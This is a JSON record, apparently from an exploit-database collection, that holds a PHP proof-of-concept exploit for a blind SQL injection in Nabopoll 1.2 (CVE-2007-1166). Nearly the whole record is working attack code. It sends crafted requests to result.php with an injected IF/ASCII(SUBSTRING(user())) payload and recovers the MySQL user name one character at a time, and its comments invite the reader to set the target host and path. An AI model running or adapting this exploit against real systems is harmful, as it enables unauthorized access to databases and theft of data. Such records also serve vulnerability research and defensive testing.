{
  "id": "3355",
  "title": "Nabopoll 1.2 - &#039;result.php?surv&#039; Blind SQL Injection",
  "cve": "CVE-2007-1166",
  "vuln_type": "sqli",
  "code": "<?\r\n# Nabopoll Blind SQL Injection P0C Exploit\r\n# Download: www.nabocorp.com/nabopoll/\r\n# coded by s0cratex\r\n# Contact: s0cratex@hotmail.com\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\n\r\n// just change the default values...\r\n$srv = \"localhost\"; $path = \"/poll\"; $port = 80;\r\n$survey = \"8\"; //you can verify the number entering in the site and viewing the results...\r\n\r\necho \"==================================================\\n\";\r\necho \"Nabopoll SQL Injection -- Proof of Concept Exploit\\n\";\r\necho \"--------------------------------------------------\\n\\n\";\r\necho \" -- MySQL User: \";\r\n$j = 1; $user = \"\";\r\nwhile(!strstr($user,chr(0))){\r\nfor($x=0;$x<255;$x++){\r\n$xpl = \"/result.php?surv=\".$survey.\"/**/AND/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(user(),\".$j.\",1))=\".$x.\"),1,0)))/*\";\r\n$cnx = fsockopen($srv,$port);\r\nfwrite($cnx,\"GET \".$path.$xpl.\" HTTP/1.0\\r\\n\\r\\n\");\r\nwhile(!feof($cnx)){ if(ereg(\"power\",fgets($cnx))){ $user.=chr($x);echo chr($x); break; } }\r\nfclose($cnx);\r\nif ($x==255) {\r\ndie(\"\\n Try again...\");\r\n}\r\n}\r\n$j++;\r\n}\r\necho \"\\n\";\r\n?>\r\n\r\n# milw0rm.com [2007-02-21]",
  "url": "https://www.exploit-db.com/exploits/3355"
}